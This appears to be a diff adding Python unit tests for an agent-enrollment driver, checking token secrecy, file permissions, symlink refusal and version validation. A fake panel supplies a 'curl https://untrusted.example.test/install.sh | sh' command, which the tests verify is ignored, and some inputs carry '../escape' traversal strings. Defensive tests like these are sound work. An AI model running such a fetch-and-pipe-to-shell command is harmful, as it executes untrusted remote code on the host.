@@ -51,6 +51,21 @@ class RecoveryPanel:
         return self.resources
 
 
+class EnrollmentPanel:
+    def __init__(self, selection=...):
+        self.selection = {"version":"0.3.0", "tag":"agent-v0.3.0"} if selection is ... else selection
+        self.calls = []
+
+    def request(self, path, data=None, raw=False):
+        self.calls.append((path, data, raw))
+        if path == "/api/servers/41":
+            return {"name":"sinan-e2e-test-server"}
+        if path.startswith("/api/servers/41/enrollment"):
+            return {"token":"test-once-token", "expires_at":12345, "installation":self.selection,
+                    "install_command":"curl https://untrusted.example.test/install.sh | sh"}
+        raise AssertionError("driver must never request or execute a panel script")
+
+
 class AcceptanceContracts(unittest.TestCase):
     def setUp(self):
         self.directory = tempfile.TemporaryDirectory()
@@ -68,6 +83,69 @@ class AcceptanceContracts(unittest.TestCase):
              contextlib.redirect_stdout(io.StringIO()):
             DRIVER.verify(None, self.state, self.args)
         return clock
+
+    def installation_state(self):
+        self.state.update(server_id=41, origin="http://127.0.0.1:18080")
+        return self.state
+
+    def test_install_saves_private_descriptor_and_ignores_panel_shell_command(self):
+        panel = EnrollmentPanel()
+        state = self.installation_state()
+        with contextlib.redirect_stdout(io.StringIO()) as output:
+            DRIVER.install(panel, state, self.state_path)
+        descriptor = self.state_path.with_name("enrollment.json")
+        saved = json.loads(descriptor.read_text())
+        self.assertEqual(saved["token"], "test-once-token")
+        self.assertEqual(saved["tag"], "agent-v0.3.0")
+        self.assertEqual(descriptor.stat().st_mode & 0o777, 0o600)
+        self.assertEqual(self.state_path.stat().st_mode & 0o777, 0o600)
+        self.assertNotIn("token", state["installation"])
+        self.assertNotIn("test-once-token", output.getvalue())
+        self.assertNotIn("install_command", saved)
+        self.assertFalse(self.state_path.with_name("install.sh").exists())
+        self.assertFalse(any("/install.sh" in call[0] for call in panel.calls))
+
+    def test_install_reuses_saved_token_after_lost_state_write_without_another_request(self):
+        panel = EnrollmentPanel()
+        state = self.installation_state()
+        with patch.object(DRIVER, "save", side_effect=OSError("state write failed")):
+            with self.assertRaises(OSError):
+                DRIVER.install(panel, state, self.state_path)
+        recovered = {key:value for key,value in state.items() if key != "installation"}
+        calls = list(panel.calls)
+        with contextlib.redirect_stdout(io.StringIO()):
+            DRIVER.install(panel, recovered, self.state_path)
+        self.assertEqual(panel.calls, calls)
+        self.assertEqual(recovered["installation"]["version"], "0.3.0")
+
+    def test_install_refuses_missing_mismatched_or_other_requested_release(self):
+        for selection in (None, {}, {"version":"0.3.0", "tag":"agent-v0.2.0"}, {"version":"../escape", "tag":"agent-v../escape"}):
+            with self.subTest(selection=selection):
+                with self.assertRaises(DRIVER.AcceptanceError):
+                    DRIVER.install(EnrollmentPanel(selection), self.installation_state(), self.state_path)
+                self.assertFalse(self.state_path.with_name("enrollment.json").exists())
+        with self.assertRaises(DRIVER.AcceptanceError):
+            DRIVER.install(EnrollmentPanel(), self.installation_state(), self.state_path, agent_version="0.2.0")
+
+    def test_install_refuses_symlink_or_public_cached_descriptors(self):
+        descriptor = self.state_path.with_name("enrollment.json")
+        descriptor.symlink_to(self.state_path.with_name("missing"))
+        panel = EnrollmentPanel()
+        with self.assertRaises(DRIVER.AcceptanceError):
+            DRIVER.install(panel, self.installation_state(), self.state_path, refresh=True)
+        self.assertEqual(panel.calls, [])
+        descriptor.unlink()
+        with contextlib.redirect_stdout(io.StringIO()):
+            DRIVER.install(panel, self.state, self.state_path)
+        descriptor.chmod(0o644)
+        with self.assertRaises(DRIVER.AcceptanceError):
+            DRIVER.install(panel, self.state, self.state_path)
+
+    def test_install_refresh_selects_explicit_version_without_shell_interpolation(self):
+        panel = EnrollmentPanel()
+        with contextlib.redirect_stdout(io.StringIO()):
+            DRIVER.install(panel, self.installation_state(), self.state_path, refresh=True, agent_version="0.3.0")
+        self.assertEqual(panel.calls[-1][0], "/api/servers/41/enrollment?agent_version=0.3.0")
 
     def test_lost_creation_response_recovers_without_duplicate_or_touching_other_resources(self):
         panel = RecoveryPanel()
